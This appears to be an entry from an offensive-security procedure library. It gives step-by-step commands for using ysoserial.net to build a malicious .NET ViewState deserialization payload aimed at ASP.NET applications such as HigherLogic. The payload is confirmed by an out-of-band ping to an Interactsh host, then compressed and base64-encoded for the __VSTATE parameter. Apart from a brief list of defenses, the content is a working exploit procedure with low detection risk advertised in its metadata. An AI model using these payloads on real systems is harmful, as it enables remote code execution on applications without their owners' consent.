---
tags:
  - rce
  - deserialization
  - .net
type: procedure
tools:
  - '[[tools/ysoserial.net]]'
  - '[[tools/base64]]'
  - '[[tools/gzip]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/ysoserial-generate-payload]]'
verified: false
platforms:
  - .NET
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:49.136Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 33cfff5e-afe6-4b4e-b22b-e24e3b9a16e9
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
---
id: 123e4567-e89b-12d3-a456-426614174001
name: Generate-Malicious-Deserialization-Payload-with-ysoserial
type: procedure
verified: false
submitted: false
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
tactics: [[Execution]]
techniques: [[Exploitation for Client Execution]]
tags: rce, deserialization, .net
commands: [[commands/ysoserial-generate-payload]]
platforms: .NET, Web
tools: [[tools/ysoserial.net]], [[tools/base64]], [[tools/gzip]]
---

# Generate-Malicious-Deserialization-Payload-with-ysoserial

## Summary

This procedure uses ysoserial.net to generate a malicious .NET deserialization payload exploiting unsafe ViewState handling, processed for insertion into form parameters to achieve RCE.

## Description

In scenarios targeting ASP.NET applications like HigherLogic, unsafe deserialization of ViewState data allows attackers to inject gadget chains that execute arbitrary code upon form submission. This procedure crafts a TypeConfuseDelegate gadget using LosFormatter to run a ping command, confirming RCE via DNS exfiltration. Prerequisites include ysoserial.net installed and an Interactsh instance running for OOB verification.

## Requirements

1. ysoserial.net binary accessible (Windows/.NET environment)
2. Interactsh server running to capture DNS interactions
3. Basic command-line tools (base64, gzip) available
4. Knowledge of target gadget chains for .NET

## Defense

Defensive measures and detection strategies:

- Enable ViewState MAC validation and encryption
- Use allowlisting for deserialization types
- Monitor for anomalous DNS requests to unusual domains
- Implement WAF rules to block suspicious base64 payloads in POST data

## Objectives

1. Create a serialized payload that triggers RCE on deserialization
2. Compress and encode for transmission limits in ViewState
3. Verify payload integrity before insertion

## Instructions

### Step 1: Execute ysoserial to Generate Raw Payload

**Context**: Use ysoserial.net to build the gadget chain that executes the ping command on deserialization.

**Command** ([[commands/ysoserial-generate-payload]]):
```bash
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "ping aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.interactsh.com" -o raw
```

> This generates the raw serialized payload for the TypeConfuseDelegate gadget using LosFormatter, embedding a ping to a unique Interactsh subdomain for OOB confirmation. Expected output is binary data representing the gadget chain.

### Step 2: Process Payload for Insertion

**Context**: Pipe the raw output through base64 decode (if needed), gzip compression, and final base64 encoding to fit ViewState constraints.

**Command** ([[commands/ysoserial-generate-payload]] continuation):
```bash
| base64 -d | gzip - | base64 -w0
```

> Handles any initial encoding, compresses to reduce size, and encodes without line wraps for direct __VSTATE use. Expected output is a single long base64 string.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation for Client Execution]]

### Sub-Techniques


## Commands Used

- [[commands/ysoserial-generate-payload]]

## Tools Used

- [[tools/ysoserial.net]]

## Tags

- rce
- deserialization
- .net
